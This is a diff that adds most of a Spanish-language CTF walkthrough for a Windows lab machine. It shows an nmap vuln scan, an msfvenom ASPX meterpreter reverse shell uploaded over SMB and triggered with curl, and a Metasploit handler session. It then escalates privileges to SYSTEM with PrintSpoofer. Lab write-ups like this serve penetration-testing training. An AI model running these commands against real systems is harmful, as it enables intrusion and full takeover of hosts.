@@ -136,11 +136,140 @@ https://www.exploit-db.com/exploits/43970
 
 # Explotación
 
+```
+nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 10.10.11.56
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-12 09:17 GMT
+Nmap scan report for ip-10-10-11-56.eu-west-1.compute.internal (10.10.11.56)
+Host is up (0.024s latency).
+
+PORT     STATE SERVICE
+80/tcp   open  http
+|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+|_sslv2-drown: 
+MAC Address: 02:19:E7:F2:C8:1B (Unknown)
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 67.88 seconds
+```
+
 Primero de todo generaremos un rev shell con msfvenom 
 
 ```
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.30.244 lport=9001 -f aspx -o reverse_shell.aspx
 ```
 
+La subimos al smb
+
+![image](https://github.com/user-attachments/assets/19591c74-c392-4638-afe2-4f31d147d254)
+
+Una vez subimos, nos generamos un nc con metasploit
+
+```
+use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.10.221.106
+lhost => 10.10.221.106
+msf6 exploit(multi/handler) > set lport 9001
+lport => 9001
+msf6 exploit(multi/handler) > set payload windowx/x64/meterpreter_reverse_tcp
+[-] The value specified for payload is not valid.
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
+payload => windows/x64/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > run
+```
+
+Una vez estemos a la espera de la escucha le mandamos un Curl
+
+```
+curl http://10.10.11.56:49663/nt4wrksv/reverse_shell.aspx
+```
+Después de la espera estaremos dentro y podemos coger la flag user.txt
+
+C:\Users\Bob\Desktop
+
+# Escalada de privilegios
+
+Dentro podemos generar una shell
+
+```
+shell
+```
+
+O con el mismo metasploit podemos coger privilegios y saber quien somos
+
+```
+getprivs
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+```
+
+Buscando estos privilegios podemos encontrar herramientas que nos puedan escalar, como por ejemplo "PrintSpoofer" que juega con el privilegios de "SeImpersonatePrivilege"
+
+https://github.com/itm4n/PrintSpoofer/tree/master
+
+Vamos para allí!!!
+
+Nos cogemos el programa .exe
+
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+```
+
+Una vez descargado, nos vamos a la shell si estamos con metasploit va a ser mucho mas fácil porque podemos subir archivos locales, 
+
+```
+upload /root/PrintSpoofer64.exe
+```
+
+Nos metemos dentro de la shell de windows y ejecutamos el archivo (una ruta para poder subir archivos "C:\Users\Public"
+
+```
+PrintSpoofer64.exe -i -c powershell.exe
+```
+
+Si alguien le interesa como funciona realmente este exploit : https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
+
+GG!!! SOMOS ROOT
+
+```
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+```
 
 
